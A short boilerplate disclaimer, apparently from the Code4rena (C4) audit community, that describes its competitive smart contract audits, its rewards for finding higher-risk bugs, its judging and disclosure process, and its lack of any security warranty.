C4 is an open organization governed by participants in the community.

C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
